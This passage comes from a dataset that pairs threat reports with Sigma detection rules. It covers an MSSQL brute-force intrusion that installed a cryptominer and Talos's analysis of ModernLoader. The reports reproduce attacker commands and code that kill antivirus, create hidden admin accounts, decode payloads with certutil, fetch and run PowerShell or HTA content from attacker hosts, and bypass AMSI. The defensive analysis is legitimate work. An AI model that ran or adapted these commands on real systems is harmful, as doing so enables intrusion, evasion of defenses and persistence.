`xp_cmdshell`:\n\n```\nEXEC xp_cmdshell 'whoami'\n```\n\nAt a high level, the overall execution events can be depicted in the below diagram:\n\n```image\nAlt: Execution Diagram\nDescription: The image is a flow diagram illustrating the execution events following a successful brute-force attack against a SQL Server. It details the steps from authentication via brute force, the use of the command shell via `xp_cmdshell`, writing various scripts and files to disk, compiling a MOF file, and killing antivirus processes. The diagram includes visual elements like boxes and arrows showing the progression of actions taken by threat actors, such as adding local administrator accounts and setting up a scheduled task for running XMRig CoinMiner.\nTranscription: |\n  START\n    Brute-Force Attack Against SQL Server\n      Successful Authentication via Brute Force Attack\n        Command Shell via xp_cmdshell\n          Writes 1.bat, and bigfile.txt to disk\n            decodes bigfile.txt with certutil into bigfile.exe\n              bigfile.exe used to run 1.bat\n                1.bat performs the following\n                  Adding Local Administrator Accounts\n                  Hiding New Local Admin Accounts\n                  Enables RDP\n                  Enables Widget\n          Writes kit.bat to disk\n            Running XMRig CoinMiner\n              Creating scheduled task for CoinMiner\n      Compiling BMOF file\n        Adding a new class/ MyASEventConsumer in WMI repository\n          EventConsumer (Script or executable to run)\n            Creates persistence\n            Download/executes VBE script\n              - Random Name\n              - Executes every day at 23:00\n          EventFilter (Trigger condition)\n          Binding (Tie together Filter + Consumer)\n    Kills AV Processes\n```\n\nIf we look into the Windows Application logs, specifically, the SQL Server event ID 15457 captures this as an `xp_cmdshell` event. Additionally, the SQL Server audit collection also captures similar events. The first commands executed by the threat actors included using `taskkill` for various anti-virus software.\n\n### Commands to kill AV processes:\n\n```\ntaskkill /f /im egui.exe\ntaskkill /f /im QQPCTray.exe\ntaskkill /f /im SafeDogGuardCenter.exe\ntaskkill /f /im 360safe.exe\ntaskkill /f /im net1895.exe\ntaskkill /f /im ekrn.exe\ntaskkill /f /im 360rp.exe\ntaskkill /f /im QQPCMgr.exe\ntaskkill /f /im SafeDogServerUI.exe\ntaskkill /f /im SafeDogSiteIIS.exe\n```\n\nThe threat actors also favored the execution of batch scripts on the compromised host. They used `xp_cmdshell` to write a batch script (`1.bat`) to disk by redirecting strings to the file using `echo` commands.\n\n```image\nAlt: Batch Script Creation\nDescription: The image displays a table detailing a process execution log from a cybersecurity incident. It includes columns for 'Initiating Process File Name', 'Action Type', 'Initiating Process Command Line', 'Initiating Process Account Name', and 'File Name'. The table shows that 'cmd.exe' initiated a file creation action, specifically creating a batch file named '1.bat'. The command line executed involves various administrative commands, such as adding a user to local groups and modifying registry entries.\nTranscription: |\n  | Initiating Process File Name | Action Type | Initiating Process Command Line| Initiating Process Account Name | File Name |\n  | ---------------------------- | ----------- || ------------------------------- | --------- |\n  | cmd.exe                      | FileCreated | \"cmd.exe\" /c (echo NET USER Admin\\$ !67hC5140Rvg /ADD /expires:never & echo NET LOCALGROUP Administrators /ADD Admin\\$ & REG ADD \"HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" /v SpecialAccounts\\Userlist /t REG_DWORD /d 0 & echo reg add \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest\" /v UseLogonCredential /t REG_DWORD /d 1 /f & echo reg add \"HKLM\\LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\" /v UserAuthentication /t REG_DWORD /d 0 /f & echo reg add \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\WinStations\\RDP-TCP\" /v UserAuthentication /t REG_DWORD /d 0 /f & echo NET LOCALGROUP Administrators /ADD Admin\\$ & echo NET LOCALGROUP Administrators /ADD Admin\\$ > %USERPROFILE%\\AppData\\1.bat | mssql$sqlexpress                | 1.bat     |\n```\n\nA second set of commands was also echoed into a file named `bigfile.txt`. Once complete, `certutil` was used to decode the text and create an executable file.\n\n### Certutil command:\n\n```\ncmd.exe /c certutil -decode %USERPROFILE%\\AppData\\bigfile.txt %USERPROFILE%\\AppData\\bigfile.exe\n```\n\nThis executable was then used in executing the `1.bat` batch file.\n\n### Command to execute batch file:\n\n```\ncmd.exe /c %USERPROFILE%\\AppData\\bigfile.exe -i -c %USERPROFILE%\\AppData\\1.bat\n```\n\nPulling the hash of the file that was written matches what appears to be a privilege escalation tool as seen in the hits from THOR scanner: \nhttps://www.virustotal.com/gui/file/b67dfd4a818d10a017a4d32386cf4cd2a3974636bed04f27e45de6ada86a56d2/community\n\n```image\nAlt: THOR Scanner\nDescription: The image displays a screenshot from the THOR APT Scanner, detailing YARA signature matches for various hacking tools and indicators. It includes specific rules like 'Hacktool_Inject_Incognito' and 'Hacktool_Privilege_Escalation_Jan22_1,' with links to their descriptions and detection information. Detection timestamps and AV detection rates (e.g., 8/67) are also provided, indicating the effectiveness of the rules in identifying malicious activity.\nTranscription: |\n  thor\n  1 month ago\n  \n  YARA Signature Match - THOR APT Scanner\n  \n  RULE: Hacktool_Inject_Incognito\n  RULE_SET: Livehunt - Hacktools Indicators ⚔️\n  RULE_TYPE: VALHALLA rule feed only\n  RULE_LINK: https://valhalla.nextron-systems.com/info/rule/Hacktool_Inject_Incognito\n  DESCRIPTION: Detects hacktool incognito\n  RULE_AUTHOR: Florian Roth\n  \n  Detection Timestamp: 2022-06-07 23:44\n  AV Detection Ratio: 6 / 67\n  \n  Use these tags to search for similar matches: #hacktool #incognito #hacktool_inject_incognito\n  More information: https://www.nextron-systems.com/notes-on-virustotal-matches/\n  \n  ---\n  \n  thor\n  1 month ago\n  \n  YARA Signature Match - THOR APT Scanner\n  \n  RULE: Hacktool_Incognito_av\n  RULE_SET: Livehunt - Hacktools Indicators ⚔️\n  RULE_TYPE: VALHALLA rule feed only\n  RULE_LINK: https://valhalla.nextron-systems.com/info/rule/Hacktool_Incognito_av\n  DESCRIPTION: Detects Hacktool Incognito Av\n  REFERENCE: https://www.virustotal.com/en/file/18e64d4c240f6481e7bd542f6c8acc802549d437ec0018e10a3b0b6f675d/analysis/\n  RULE_AUTHOR: Florian Roth\n  \n  Detection Timestamp: 2022-06-07 23:44\n  AV Detection Ratio: 8 / 67\n  \n  Use these tags to search for similar matches: #hacktool #incognito #hacktool_incognito_av\n  More information: https://www.nextron-systems.com/notes-on-virustotal-matches/\n  \n  ---\n  \n  thor\n  1 month ago\n  \n  YARA Signature Match - THOR APT Scanner\n  \n  RULE: HKTK_Inject_Privilege_Escalation_Jan22_1\n  RULE_SET: Livehunt - Hacktools Indicators ⚔️\n  RULE_TYPE: VALHALLA rule feed only\n  RULE_LINK: https://valhalla.nextron-systems.com/info/rule/HKTK_Inject_Privilege_Escalation_Jan22_1\n  DESCRIPTION: Detects a hacktool that seems to provide privilege escalation vectors\n  RULE_AUTHOR: Florian Roth\n  \n  👋 Hey, this seems to be an open-source tool or framework. The author has shared it with the community with the intention to improve overall security. If you are a victim and noticed this tool in a breach, please visit the tool's github page (see above) and tell your story by creating an issue on the issues page: https://github.com/KaLendis/CVE-2022-21882/issues ❤️.\n  \n  Detection Timestamp: 2022-06-07 23:44\n  AV Detection Ratio: 6 / 67\n```\n\nWe believe this tool may be a variation of NetworkServiceExploit.exe, which attempts to use NetworkService for privilege escalation.\n\n---\n\n## Persistence\n\nThe threat actors wrote a batch script (`1.bat`) that contained commands for establishing persistence on the compromised host. We see the creation of a new account and adding this account to the local administrators group.\n\n### Commands to create and add user:\n```\nNET USER Adminv$ !67hCS14ORVg /ADD /expires:never\nNET LOCALGROUP Administrators /ADD Adminv$\n```\n\nThey also made remote RDP connections possible by changing the `fDenyTSConnections` and `UserAuthentication` values to `0`.\n\n### Commands to enable RDP:\n```\nreg add \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\" /v fDenyTSConnections /t REG_DWORD /d 0 /f\nreg add \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\WinStations\\RDP-TCP\" /v UserAuthentication /t REG_DWORD /d \"0\" /f\n```\n\nThe full contents of `1.bat` also included commands to hide the user account by adding it to the registry using \"Special Accounts\".\n\n### Command to hide user account:\n```\nREG ADD \"HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\SpecialAccounts\\Userlist\" /v Adminv$ /t REG_DWORD /d 0\n```\n\n---\n\n## Credential Access\n\nDuring the initial access, credentials were obtained via a brute-force attack against the exposed MSSQL server. No other credential access was observed during this intrusion, although the threat actors did enable WDigest to make later credential access easier.\n\n---\n\n## Command and Control\n\nWe observed that the domain `mymst007[.]info` is used to download further payloads. The domain was created five years ago. We have seen similar reports that make mention of the same infrastructure. Attacks associated with this domain include the same or similar tactics techniques and procedures (TTPs).\n\n```image\nAlt: Connections\nDescription: The image is a detailed diagram illustrating the connections and communications related to the domain 'mymst007.info'. It includes nodes representing contacted IPs, domains, downloaded files, and URLs, along with specific filenames such as 'CSRSS.exe' and 'weixin.html'. The diagram visually maps out the relationships and interactions between these elements, highlighting the command and control infrastructure associated with the observed cyber attacks.\nTranscription: |\n  - Resolutions\n    - mst.mymst007.info\n    - mst2.mymst007.info\n  - Siblings\n  - Contacted ips\n  - Contacted domains\n  - Communicating files\n  - Downloaded files\n    - weixin.html\n  - Referrer files\n    - 3f14dc75982f1abd67e66623c5c8277b8d109be96b6f8fef92e4c0be7b2c9b1\n    - wrmi-instance-script.txt (1e4fdd4670ddb98286ed18bb3940c812215b2e5bda0886589e397667000391f)\n    - 563d381d5f8c7fecc6bd8e228cdf8beccab81fe5b1cfb29ddc34dc779e70e1\n    - 1c496854a393f70196745be19e47d758d50df22e2ed3c247a2008576105f\n  - Contacted urls\n    - http://mst2.mymst007.info/\n    - http://mst2.mymst007.info:4000/ver\n    - http://mst.mymst007.info/\n    - http://mst.mymst007.info:8080/all.dll.asp\n    - http://mst.mymst007.info/perp2017/home2/pergavr2017/a.exe\n  - CSRSS.exe\n```\n\n---\n\n## Impact\n\nThe impact was concentrated on this one host. We did not see any further activity in this case. The compromised host had XMRig miner installed and running. The miner was also connecting to cryptomining pools such as `minergate[.]com`.\n\n---\n\n## Indicators\n\n### File\n\n```\nWinRing0x64.sys\n0c0195c48b6b8582fa6f6373032118da\nd25340ae8e92a6d29f599fef426a2bc1b5217299\n11bd2c9f9e2397c9a16e0990e4ed2cf0679498fe0fd418a3dfdac60b5c160ee5\n\nex.exe\na7bafac5ed29a68e0fff6eecc3f5bb3f\n4f19b6970e35b3d20f84a91e3af0d82c68096710\n428d06c889b17d5f95f9df952fc13b1cdd8ef520c51e2abff2f9192aa78a4b24\n\nkit.bat\n91931a2b1ae645004023e1b35fe57314\n9f5a7a293c92ef42374cf1471b653ed994446c15\n4905b7776810dc60e710af96a7e54420aaa15467ef5909b260d9a9bc46911186\n\nsmss.exe\ne579cd176b384b38eda6a0c61c51c274\n8a3b31ac12d9ac1a44707b1de75b8870189db83a\nd3c3f529a09203a839b41cd461cc561494b432d810041d71d41a66ee7d285d69\n\nxit\n88fba011db6e5122f4aa2c0343e11275\na2d34aeee2fb7c1ba57a11c03cc33e76f1217548\ncfa12bb31d58d30875b7a20ed05b5c100032b6a18802fbdf3913e70288e11a55\n\nxitmf\n0c8622c4871541e89d0173d5be0db8aa\nb01a88df39857417233d9bd3256f82d0fdcc63f8\nbeda317d74b8f1090e251205064e686d330a0502006a54dc94d528d6bd16c416\n```\n\n### Network\n\n```\nminergate[.]com\nmymst007[.]info\nbj87670@gmail.com\n```\n\n---\n\n## Detections\n\n### Sigma Rules\n\n- Suspicious Commands by SQL Server\n- MOFComp Execution\n- Hiding Local User Accounts\n\n### Yara Rules\n\n```\nrule miner_batch {\n   meta:\n      description = \"file kit.bat\"\n      author = \"TheDFIRReport\"\n      reference = \"https://thedfirreport.com/2022/07/11/select-xmrig-from-sqlserver/\"\n      date = \"2022/07/10\"\n      hash1 = \"4905b7776810dc60e710af96a7e54420aaa15467ef5909b260d9a9bc46911186\"\n   strings:\n      $a1 = \"%~dps0\" fullword ascii\n      $a2 = \"set app\" fullword ascii\n      $a3 = \"cd /d \\\"%~dps0\\\"\" fullword ascii\n      $a4 = \"set usr=jood\" fullword ascii\n      $s1 = \"schtasks /run\" fullword ascii\n      $s2 = \"schtasks /delete\" fullword ascii\n      $a5 = \"if \\\"%1\\\"==\\\"-s\\\" (\" fullword ascii\n   condition:\n      uint16(0) == 0xfeff and filesize < 1KB and\n      3 of ($a*) and 1 of ($s*)\n}\n```\n\n---\n\n## MITRE Techniques\n\n```\nT1053.005 - Scheduled Task/Job: Scheduled Task\nT1136.001 - Create Account: Local Account\nT1546.003 - Event Triggered Execution: Windows Management Instrumentation Event Subscription\nT1564.002 - Hide Artifacts: Hidden Users\nT1059.003 - Command and Scripting Interpreter: Windows Command Shell\nT1027.004 - Obfuscated Files or Information: Compile After Delivery\nT1110.001 - Brute Force: Password Guessing\nT1070.004 - Indicator Removal on Host: File Deletion\nT1562.001 – Impair Defenses: Disable or Modify Tools\nT1546.012 - Event Triggered Execution: Image File Execution Options Injection\nT1140 - Deobfuscate/Decode Files or Information\nT1112 - Modify Registry\nT1078 - Valid Accounts\nT1134.001 - Token Impersonation/Theft\n```",
    "sigma_rule": {
      "title": "Potential Suspicious Mofcomp Execution",
      "id": "1dd05363-104e-4b4a-b963-196a534b03a1",
      "status": "test",
      "description": "Detects execution of the \"mofcomp\" utility as a child of a suspicious shell or script running utility or by having a suspicious path in the commandline.\nThe \"mofcomp\" utility parses a file containing MOF statements and adds the classes and class instances defined in the file to the WMI repository.\nAttackers abuse this utility to install malicious MOF scripts\n",
      "references": [
        "https://thedfirreport.com/2022/07/11/select-xmrig-from-sqlserver/",
        "https://github.com/The-DFIR-Report/Sigma-Rules/blob/75260568a7ffe61b2458ca05f6f25914efb44337/win_mofcomp_execution.yml",
        "https://learn.microsoft.com/en-us/windows/win32/wmisdk/mofcomp"
      ],
      "author": "Nasreddine Bencherchali (Nextron Systems)",
      "date": "2022-07-12",
      "modified": "2023-04-11",
      "tags": [
        "attack.defense-evasion",
        "attack.t1218"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection_img": [
          {
            "Image|endswith": "\\mofcomp.exe"
          },
          {
            "OriginalFileName": "mofcomp.exe"
          }
        ],
        "selection_case": [
          {
            "ParentImage|endswith": [
              "\\cmd.exe",
              "\\powershell.exe",
              "\\pwsh.exe",
              "\\wsl.exe",
              "\\wscript.exe",
              "\\cscript.exe"
            ]
          },
          {
            "CommandLine|contains": [
              "\\AppData\\Local\\Temp",
              "\\Users\\Public\\",
              "\\WINDOWS\\Temp\\",
              "%temp%",
              "%tmp%",
              "%appdata%"
            ]
          }
        ],
        "filter_main_wmiprvse": {
          "ParentImage": "C:\\Windows\\System32\\wbem\\WmiPrvSE.exe",
          "CommandLine|contains": "C:\\Windows\\TEMP\\",
          "CommandLine|endswith": ".mof"
        },
        "filter_optional_null_parent": {
          "CommandLine|contains": "C:\\Windows\\TEMP\\",
          "CommandLine|endswith": ".mof"
        },
        "condition": "all of selection_* and not 1 of filter_main_* and not 1 of filter_optional_*"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_mofcomp_execution.yml",
    "id": "255"
  },
  {
    "url": "https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1562.001/T1562.001.md",
    "markdown": "",
    "sigma_rule": {
      "title": "Windows Defender Definition Files Removed",
      "id": "9719a8aa-401c-41af-8108-ced7ec9cd75c",
      "status": "test",
      "description": "Adversaries may disable security tools to avoid possible detection of their tools and activities by removing Windows Defender Definition Files",
      "references": [
        "https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1562.001/T1562.001.md",
        "https://unit42.paloaltonetworks.com/unit42-gorgon-group-slithering-nation-state-cybercrime/"
      ],
      "author": "frack113",
      "date": "2021-07-07",
      "modified": "2023-07-18",
      "tags": [
        "attack.defense-evasion",
        "attack.t1562.001"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection_img": [
          {
            "Image|endswith": "\\MpCmdRun.exe"
          },
          {
            "OriginalFileName": "MpCmdRun.exe"
          }
        ],
        "selection_cli": {
          "CommandLine|contains|all": [
            " -RemoveDefinitions",
            " -All"
          ]
        },
        "condition": "all of selection_*"
      },
      "fields": [
        "ComputerName",
        "User",
        "CommandLine",
        "ParentCommandLine"
      ],
      "falsepositives": [
        "Unknown"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_mpcmdrun_remove_windows_defender_definition.yml",
    "id": "259"
  },
  {
    "url": "https://blog.talosintelligence.com/modernloader-delivers-multiple-stealers-cryptominers-and-rats/",
    "markdown": "# ModernLoader delivers multiple stealers, cryptominers and RATs\n\nThursday, September 1, 2022\nCategory: Threat Spotlight\n\n## Key Points\n\n- Cisco Talos recently observed three separate, but related, campaigns between March and June 2022 delivering a variety of threats, including the ModernLoader bot, RedLine information-stealer, and cryptocurrency-mining malware to victims.\n- The actors use PowerShell, .NET assemblies, and HTA and VBS files to spread across a targeted network, eventually dropping other pieces of malware, such as the SystemBC trojan and DCRAT, to enable various stages of their operations. The attackers’ use of a variety of off-the-shelf tools makes it difficult to attribute this activity to a specific adversary.\n- The final payload appears to be ModernLoader, which acts as a remote access trojan (RAT) by collecting system information and deploying various modules. In the earlier campaigns from March, we also observed the attackers delivering the cryptocurrency mining malware XMRig. The March campaigns appeared to be targeting Eastern European users, as the constructor utility we analyzed had predefined script templates written in Bulgarian, Polish, Hungarian, and Russian.\n- The actors are attempting to compromise vulnerable web applications to serve malware and deliver threats via files masquerading as fake Amazon gift cards.\n\n## Technical details\n\n### Initial findings\n\nIn June 2022, Cisco Talos identified an unusual command line execution in our telemetry. The decoded base64 command is below:\n\n```image\nAlt: Initial finding: A command executed on the system.\nDescription: The image displays a decoded command line execution format that has been observed in the telemetry of Cisco Talos. It appears to be a PowerShell command used for downloading content from a specified URL (`http://31.41.244.231/0xNANA/no.go`). The command employs various PowerShell constructs such as `New-Object` and `Join` for concatenating strings, indicating potential malicious intent related to downloading additional payloads.\nTranscription: |\n  $f5='bClient'.Downlo'; $f1='(New-Object Net.We'; $f3='adString('http:31.41.244.231/0xNANA/no.go')'; $600='E`X ($f1,$f5,$f3 -Join '')|I`E`X\n```\n\nThe 31.41.244[.]231 IP is a Russian IP and hosts several other URLs with similar naming conventions.\n\n### Autostart command\n\nFollowing the discovery of the initial command, we identified two other command lines. They are a result of an autorun registered executable and the execution of a scheduled task.\n\n```image\nAlt: The autorun executable and scheduled task command lines.\nDescription: The image displays a snippet of code related to the execution of a malicious PowerShell command. It shows how the command invokes 'mshta' to run a VBScript which in turn executes a file named 'AUTORUNNN.exe' located in the user’s AppData folder. The command also includes a URL that likely points to a remote server from which additional payloads may be downloaded.\nTranscription: |\n  cmd /c mshta hxxp://31[.]41[.]244[.]231/0x?0=WindowsAnalyticsConfiguration\n  \n  mshta.exe vbscript:CreateObject(Wscript.Shell).Run(\"C:\\Users\\<Username>\\AppData\\Local\\AUTORUNNN.exe\")(window.close)\n```\n\nThe first command connects to the download server and downloads an HTA application whose script is obfuscated with HTML Guardian, an application that encrypts HTML code.\n\n```image\nAlt: The content displayed when the HTA file is opened in a browser.\nDescription: The image displays a screenshot of a web page that has been protected by HTML Guardian. It shows a banner indicating that the source code of the page is being safeguarded against unauthorized access. The banner includes text stating 'Loading ...' and provides a link to HTML Guardian's website. This image is relevant to the context as it illustrates how the HTA application secures its HTML code, which is a key aspect of the discussed malware operation.\nTranscription: |\n  The source code of this page is protected by HTML Guardian \n  The ultimate tool to protect your HTML code, images, Java applets, Javascripts, links, keep web content filters away and much more... \n  www.ProtWare.com \n  Loading ...\n```\n\nWhen deobfuscated, the HTA file executes the VB script code to download and run PowerShell code from hxxp[:]//31[.]41[.]244[.]231/0x?0=Loader, which launches the next stage of the loading process.\n\n```image\nAlt: Deobfuscated HTA code.\nDescription: The image displays a snippet of obfuscated VBScript code used in a cyber attack, specifically for downloading and executing malicious payloads. The code includes commands for creating objects, replacing variables, and executing a PowerShell command from a specified URL. It also features error handling and string manipulation to obfuscate its functionality, highlighting its role in the malware's operation.\nTranscription: |\n  FIK = \"W{^_^}sc{^_^}r{^_^}e{^_^}f{^_^}i{^_^}p{^_^}e{^_^}l\"\n  FIK = Replace(FIK, \"{^_^}\", \"\")\n  Set AIR = CreateObject(FIK)\n  KIK = \"p{^_^}o{^_^}w{^_^}e{^_^}r{^_^}s{^_^}h{^_^}e{^_^}l\"\n  KIK2 = Replace(KIK, \"{^_^}\", \"\")\n  HO = \"Nano-'J00EX'.replace('J00','I');sal OY $nano=$aa='WhehxeObhxeje';$L='hhextthxep:hex/hexex/31.41.244.231/0x?0=Loader''; $bb='chex' Nehexexh.Whexhexhexhexexe; $ff='lohexhexadhexhexs'; $h='thehexirhexhexg'; $c1='(hexhexhexhexhexhexhexhex)'; $cc='bchexhexhexhexhexhexhex'; $d='Dohexhexhexwhexhexhexhex'; $ROOM='''.$d$'.Dohexhexhexwhexhexhexhex'; $ROOM=$c1,$aa,$bb,$cc,$d,$ff,$hh,$l -Join ''; $ROOM=$ROOM.replace('hex', '');\"\n  On Error Resume Next\n  AIR.Run KIK2 & HO + F$ + \"'\", Chr(52) & Chr(56)\n  Close\n```\n\nThe `autorunnn.exe` module (d9c8e82c42e489ac7a484cb98fed40980d63952be9a88ff9538fc23f7d4eb27f) is a modified variant of the SharpHide open-source utility, which attempts to create a hidden registry entry. It uses the `NtSetValueKey` native API to create a hidden (null-terminated) registry key by adding a null byte in front of the `UNICODE_STRING` key value name. In our case, SharpHide is modified to create the following entry:\n\n```\n\\HKLM|HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\shell set to run the command: “explorer.exe, cmd /c mshta hxxp://go[.]clss[.]cl/0k#=GoogleWindowsAnalyticsConfiguration”.\n```\n\nThe program also attempts to create a scheduled task which runs when the user logs onto the system. The task name is “OneDrive Standalone Update Task” and it will attempt to execute the same command to download and run the PowerShell loader:\n\n```\nmshta hxxp[:]//go[.]clss[.]cl/0k#=GoogleWindowsAnalyticsConfiguration\n```\n\n```image\nAlt: Modified SharpHide code is used to hide registry startup entry.\nDescription: The image displays a code snippet related to the malicious activity of the SharpHide utility. It shows the construction of a scheduled task named 'OneDrive Standalone Update Task' that executes a command to run an HTA file using mshta. The code is written in C# and includes registry operations to create a hidden entry in the Windows registry, ensuring that the malicious payload is executed upon user logon.\nTranscription: |\n  string text2 = \"SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run\";\n  string s = \"\\\\HKCU\\\\SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run\";\n  string name = \"Shell\";\n  string value = \"explorer.exe, cmd /c mshta http://go.clss.cl/0k#=GoogleWindowsAnalyticsConfiguration\";\n  bool isSystem;\n  using (WindowsIdentity current = WindowsIdentity.GetCurrent())\n  {\n      isSystem = current.IsSystem;\n  }\n  uint obj = 0;\n  if (isSystem || Program.IsElevated)\n  {\n      Console.WriteLine(\"\\n[+] SharpHide running as elevated user:\\n Using HKLM\\\\{0}\", text2);\n      uint num2 = Program.RegOpenKeyEx(Program.HKEY_LOCAL_MACHINE, text2, 0, Program.KEY_SET_VALUE, out zero);\n      using (RegistryKey registryKey = Registry.LocalMachine.OpenSubKey(\"SOFTWARE\\\\Microsoft\\\\Windows NT\\\\CurrentVersion\\\\\"\n          + Whinolog\\\\, RegistryKeyPermissionCheck.ReadWriteSubTree))\n      {\n          registryKey.SetValue(name, value);\n      }\n      Process.Start(new ProcessStartInfo(\"schtasks\")\n      {\n          Arguments = \"/create /tn \\\"OneDrive Standalone Update Task\\\" -S -1 -5 -21 -3301851721 -4018334294 -377670162 1001 /sc ONLOGON /tr \\\"mshta http://go.clss.cl/0k#=GoogleWindowsAnalyticsConfiguration\\\" /rl HIGHEST /f\",\n          UseShellExecute = false,\n          CreateNoWindow = true\n      }).WaitForExit(1000);\n  }\n```\n\nThe URL serves PowerShell code which will be executed on the system.\n\nAs part of the logon sequence, the system executes a file, which ensures that the registry entry and the scheduled task set to download the next stage are set.\n\n### PowerShell loader\n\nThe next stage is the PowerShell loader. The loader contains embedded code of three modules, which are loaded using reflection as additional .NET assemblies into the PowerShell process space. The downloaded PowerShell code also downloads and runs auxiliary modules and payloads.\n\nThere are usually three modules in this loader format. The first disables AMSI scanning functionality, the second is the final payload, and the last injects the payload into the process space of a newly created process, usually `RegSvcs.exe`.\n\n#### KillAMSI\n\n`Killamsi.dll` is stored as a base64-encoded string split between the first two encoded characters and the rest of the encoded assembly DLL. The DLL contains obfuscated code, which attempts to patch Microsoft's AMSI interface (`amsi.dll`) `AmsiScanBuffer` function with the code to return an error value. This may prevent antimalware engines from scanning executed PowerShell code and allow the attacker to bypass the detection of the next stages of the loader execution.\n\n```image\nAlt: Amsi.dll is decoded, loaded and its Main function called.\nDescription: The image showcases a snippet of PowerShell code related to the KillAMSI functionality. It features several lines of code that utilize methods for handling base64 strings and invoking the main function of the KillAMSI component. The specific lines include a method call to decode a base64 string and invoke a method from the Microsoft.VisualBasic.Interaction namespace, indicating its role in executing obfuscated code to bypass AMSI (Antimalware Scan Interface) protections.\nTranscription: |\n  $dd=$t.GetMethod(\"FromBase64String\")\n  $hgh=$dd.Invoke($null,$obj)\n  \n  $ui80 = [Microsoft.VisualBasic.Interaction]::CallByName([AppDomain]::CurrentDomain,\"Load\",[Microsoft.VisualBasic.CallType]::Method,$hgh)\n  \n  [KILLAMSI]::Main()\n```\n\n#### Process injector\n\nThe last module in the loader file is `friday.dll`. It is obfuscated with multiple layers of obfuscation, such as ConfuserEx and Dotnet reactor. It creates a new process and places the next injector stage into the newly created `RegSvcs.exe` process.\n\n```image\nAlt: Friday.dll module is used to inject the next injection stage into RegSvcs.exe process.\nDescription: The image displays a snippet of obfuscated PowerShell code used in the ModernLoader malware. It features various commands, including byte array initialization and method calls, likely for process injection and execution. The code includes references to a module named 'Friday.dll' and the process 'RegSvcs.exe', indicating its role in the malware's operation.\nTranscription: |\n  [Byte[]]$RO=J00 $JP\n  $AE='[$(pin)s$(pin)t$(pin)e$(pin)m$(pin)a$(pin)g$(pin)e]'.replace('(pin)', '') NX;\n  $EU=$AE.GetMethod(\"get_CurrentDomain\")\n  $SK='$EU.I$(pin)n$(pin)v$(pin)o$(pin)k$(pin)u$(pin)l$(pin)$'.replace('(pin)', '') NX\n  $FR='$SK.$(pin)l$(pin)a$(pin)d$(pin)($RO)'.Replace('(pin)', '')\n  $FR NX\n  \n  [Byte[]]$GB2= J00 $GB\n  [Friday.Boya]::KG('RegSvcs.exe',$GB2)\n```\n\nThe second-stage injector is an assembly: `Managament.inf`. It creates an instance of `svchost.exe` process and injects code using process-hollowing to load the final payload stored in the initial PowerShell loader script.\n\nThe injector creates a `svchost.exe` process in suspended mode and then allocates virtual memory for the injection of the payload module. The original `svchost` module is unmapped by calling the `ZwUnmapViewOfSection`.\n\nThis is followed by the fairly common injection sequence of API calls to get thread context, copy the data from the payload to the allocated virtual memory, set the thread context to point to the payload entry point and, finally, to resume the suspended thread.\n\nDepending on the bitness of the operating system, the appropriate functions are used for getting and setting the thread contexts of the 32-bit process from the 64-bit operating system. The injected payload is `Client.exe` (3f5856a9ec23f6daf20fe9e42e56da1b8dcb0de66b6628a92b554d6e17c02fc3), a ModernLoader instance.\n\n### ModernLoader bot (aka Avatar bot)\n\nThe payload for the initial loader URL is a simple .NET remote access trojan, ModernLoader. ModernLoader has been in use since at least 2019, and some researchers are referring to it as “Avatar bot,” although it has nothing in common with the rootkit documented in 2013 using the same name.\n\n```image\nAlt: ModernLoader’s constructor initializes the bot with a hardcoded C2 URL.\nDescription: The image shows a snippet of C# code that appears to be part of the implementation for the ModernLoader bot. The code includes several variables being initialized, such as 'Good.version', 'Good.server', 'Good.defaultPath', 'Good.terminate', 'Good.MTX', 'Good.interval', and 'Good.Rand'. The 'Good.server' variable holds a URL that indicates a command and control server, which is consistent with the bot's functionality of connecting to a server for commands and tasks.\nTranscription: |\n  static Good()\n  {\n      Good.version = \"Live\";\n      Good.server = \"http://31.41.244.231/AVAVA/gate.php\";\n      Good.defaultPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);\n      Good.terminate = false;\n      Good.MTX = \"XBoxLive%\";\n      Good.interval = 137;\n      Good.Rand = new Random();\n  }\n```\n\nOnce the bot is initialized, it collects the following information about the system and sends the information to the C2 server using the HTTP Post request to hxxp[:]//31[.]41[.]244[.]231/AVAVA/gate[.]php:\n\n- Win32_ComputerSystemProduct UUID (using WMI to query the configuration data).\n- GPU details from Win32_DisplayConfiguration.\n- The AD or the workgroup name.\n- The external IP address by reading the response from http://ipinfo.io/ip.\n- The IP address country by reading the response from http://ipinfo.io/country.\n- The Windows operating system version information.\n- The amount of RAM.\n- The processor architecture and type.\n- The user privileges (admin or user).\n- Anti-malware products installed on the affected system.\n- The amount of space left.\n- The bot version.\n- The name of the computers on the network (through querying local ActiveDirectory data).\n- The presence of an RDP module on the disk (used as auxiliary payload for the bot).\n\nOnce the initial data is sent, ModernLoader reads the response to find tasks returned from the servers using the JSON format. ModernLoader executes tasks using the function `DoTask`. `DoTask` accepts very few commands and can either execute a command line or download and execute a file. This limited functionality might have prompted the author to call this bot a loader, but for all intents and purposes, it is just a simple remote access trojan (RAT).\n\nThe advantage of using a loader such as ModernLoader is that the actor can change the campaigns and deploy different modules in real time. The way the modules are deployed, the payloads often exist only in RAM and not on the hard drive as files. Of course, this approach has a major weakness because it relies on a single IP address, which means the campaign is terminated as soon as the C2 server is 